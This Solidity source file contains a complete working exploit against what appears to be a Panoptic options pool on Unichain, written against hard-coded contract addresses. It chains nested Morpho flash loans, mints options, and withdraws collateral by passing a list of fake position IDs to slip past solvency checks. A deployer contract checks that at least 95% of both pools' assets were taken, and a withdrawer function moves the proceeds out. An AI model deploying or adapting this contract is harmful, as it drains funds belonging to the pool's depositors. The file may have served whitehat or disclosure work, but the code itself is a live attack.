// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";

contract ETH_USDT5bpsUnichainAttacker_Deployer {
    ETH_USDT5bpsUnichainAttacker public attacker;
    IWETH constant WETH = IWETH(0x4200000000000000000000000000000000000006);
    IERC20Partial token1 = IERC20Partial(address(0x9151434b16b9763660705744891fA906F660EcC5)); // usdt
    ICollateralTracker_v4 tracker0 = ICollateralTracker_v4(address(0x6F1bB1226B7dA982194444Ffae8418c7a9EF1DE9));
    ICollateralTracker_v4 tracker1 = ICollateralTracker_v4(address(0xFF95846A7c70a4525Ffa95FAD0b7ce010b3cA56f));
    constructor(address _withdrawer) {
        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        attacker = new ETH_USDT5bpsUnichainAttacker(_withdrawer);
        attacker.takeFlashLoanAndAttack();
        uint256 attackerBalance0 = WETH.balanceOf(address(attacker));
        uint256 attackerBalance1 = token1.balanceOf(address(attacker));
        require(attackerBalance0 >= (poolAssets0Before * 95) / 100);
        require(attackerBalance1 >= (poolAssets1Before * 95) / 100);
    }
}

contract ETH_USDT5bpsUnichainAttacker is IMorphoFlashLoanCallback {
    uint256[] fake_token_uints = [16988277108887827, 17035745045722363, 16993655162578412, 17009206836208441, 17083582814389265, 16940269736292543, 16898430492320797, 17069357979992109, 16916111252789762, 16980362901391387, 17026568887818250, 17006045362593199, 17154261232855203, 16936522326425929, 17030439208130036, 16945967490755149, 17063366226512834, 17097157113273900, 17066504289794370, 17119504401467382, 16920834318597884, 17034803466092545, 16942964596981210, 17025612530710537, 16889820611195521, 16954544221541041, 16904132411153761, 16949521359855531, 16920216715452750, 17129587578817479, 17085189125086153, 16914178675719633, 17126645520732798, 17074540876198711, 17119951603807036, 17036991767596593, 17058114656058193, 17049620233322987, 17097995700960721, 17089567784803601, 16997018527186481, 16900417526689188, 17024105470881979, 17073996118339521, 17060011233606751, 16946961090832675, 16941005867879549, 17103589480369901, 16989238486935005, 16934049758747081, 16894635486029112, 16963022048440415, 16992964215424125, 16942409542027123, 17062001812029684, 17038739514264792, 16896222394180792, 17140497124282292, 17100042690718021, 17005578710070990, 17052541747857150, 17001603935953842, 17029512578671493, 17166195869489409, 17106273295414794, 16908147932247101, 17022720534783960, 17075863080850773, 17017661774688634, 16971120488436790, 16988465729292003, 17014445553286162, 16974767401004252, 16899543848560918, 16967923632426531, 16908893219668699, 17099849001593597, 16929239666017003, 17122672512185594, 17044600072961146, 16956101523846221, 17050277920000050, 16934457177659003, 17083148281277439, 17032205826932525, 17088317117953075, 16935870331365850, 17029938928325889, 16987242283774540, 16888769806416760, 17029198303267245, 17004523319620584, 16972063987353239, 16947327288449607, 17029065097821193, 16942458681986566, 17057227897167136, 17029873506273690, 16990649632113938, 16968539133849167, 16993502753544935, 17157376839885919, 16936365070053071, 16968143087326031, 17154610629572122, 17022685737634914, 16991628369728980, 17064829018677470, 16921290824134246, 16991286763756420, 17094346387673542, 17030010218713865, 16970073014124536, 3437866335631248550078689307201264, 3437866335631248550078689307201264];

    // On unichain
    address token0 = address(0); // native eth
    IERC20Partial token1 = IERC20Partial(address(0x9151434b16b9763660705744891fA906F660EcC5)); // usdt
    IMorpho morpho = IMorpho(address(0x8f5ae9CddB9f68de460C77730b018Ae7E04a140A));

    // Need this for flash loaning:
    IWETH constant WETH = IWETH(0x4200000000000000000000000000000000000006);

    ICollateralTracker_v4 tracker0 = ICollateralTracker_v4(address(0x6F1bB1226B7dA982194444Ffae8418c7a9EF1DE9));
    ICollateralTracker_v4 tracker1 = ICollateralTracker_v4(address(0xFF95846A7c70a4525Ffa95FAD0b7ce010b3cA56f));
    IPanopticPool_v4 pp = IPanopticPool_v4(address(0x0000eD265C5EDAa58C3eAF503F8bFE2ccaB1C0aD));

    int24 constant MIN_V3POOL_TICK = -887272;
    int24 constant MAX_V3POOL_TICK = 887272;

    address private immutable withdrawer;

    bool private executed = false;

    constructor(address _withdrawer) {
        withdrawer = _withdrawer;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
        _;
    }

    function takeFlashLoanAndAttack() public {
        require(!executed);
        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            // Initiate first flash loan for token0
            uint256 borrowAmount0 = 2 * poolAssets0;
            // Encode the token1 borrow amount for the nested loan
            bytes memory data = abi.encode(borrowAmount0, 2 * poolAssets1, true);
            // passing in WETH, not token0, as the asset to borrow, as token0 is ETH which is not flash-loanable
            morpho.flashLoan(address(WETH), borrowAmount0, data);
        }
        executed = true;
    }

    uint256 private token0Amount; // Store for nested callback
    function onMorphoFlashLoan(
        uint256 amount,
        bytes calldata data
    ) external override {
        require(!executed);

        (uint256 amount0, uint256 amount1, bool isFirstLoan) =
                    abi.decode(data, (uint256, uint256, bool));

        if (isFirstLoan) {
            // Store token0 amount for later
            token0Amount = amount0;

            // Initiate nested flash loan for token1
            bytes memory nestedData = abi.encode(amount0, amount1, false);
            morpho.flashLoan(address(token1), amount1, nestedData);

            // After the nested callback completes, approve token0 repayment
            WETH.approve(address(morpho), amount0);
        } else {
            // This is the nested (token1) flash loan callback
            // We now have both tokens - execute the attack
            drainPool();

            // Approve token1 repayment for the nested loan
            token1.approve(address(morpho), amount1);
        }
    }

    function drainPool() internal {
        // - deposit funds
        (uint256 attackAmount0, , ) = tracker0.getPoolData();
        (uint256 attackAmount1, , ) = tracker1.getPoolData();
        uint256 wethBalance = WETH.balanceOf(address(this));
        WETH.withdraw(wethBalance);
        token1.approve(address(tracker1), type(uint104).max);

        tracker0.deposit{value: wethBalance}(uint128(wethBalance), address(this));
        tracker1.deposit(uint128(token1.balanceOf(address(this))), address(this));

        // - mint ITM options
        TokenId[] memory posIdList = new TokenId[](1);
        posIdList[0] = TokenId.wrap(3778244379283210693527917120278);
        TokenId[] memory posIdList2 = new TokenId[](2);
        posIdList2[0] = TokenId.wrap(3778244379283210693527917120278);
        posIdList2[1] = TokenId.wrap(2560008631394908969360328837910);

        // --- for Asset 0
        pp.mintOptions(
            posIdList, // positionIdList
            uint128(attackAmount0), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK, // tickLimitHigh
            false
        );

        // --- for Asset 1
        pp.mintOptions(
            posIdList2, // positionIdList
            uint128(attackAmount1), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK, // tickLimitHigh
            false
        );

        // ---------------------------------------------------------------------
        // - withdraw funds with fake position list

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = generateTokenIdListFromFakeTokenUints();

        // Now use the list of positions that don't exist

        // 1. calculate how much I can withdraw
        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        // 2. withdraw with fake list
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList, false);

        // repeat for token1
        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList, false);

        // Re-wrap the WETH to ultimately pay back the flash loan + keep profits in WETH, not ETH
        WETH.deposit{value: toWithdraw0}();

        // now liquidate my own position and repeat...
        // NOTE: Now that we execute the attack with a single drainPool, no need to do this - just
        // leave the uncollateralised positions open
        /* TokenId[] memory emptyTokenList = new TokenId[](0);
        pp.liquidate(emptyTokenList, address(this), posIdList2); */
    }

    function generateTokenIdListFromFakeTokenUints() internal view returns (TokenId[] memory fakeTokenIdList) {
        fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length;) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
            unchecked {
              ++i;
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(withdrawer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(withdrawer, amount); // revert if token transfer fails
        }
    }

    // Required to receive ETH when unwrapping WETH
    receive() external payable {
        // Accept ETH from WETH unwrapping
    }

    // Fallback for any other ETH transfers
    fallback() external payable {
        // Handle unexpected ETH transfers
    }
}
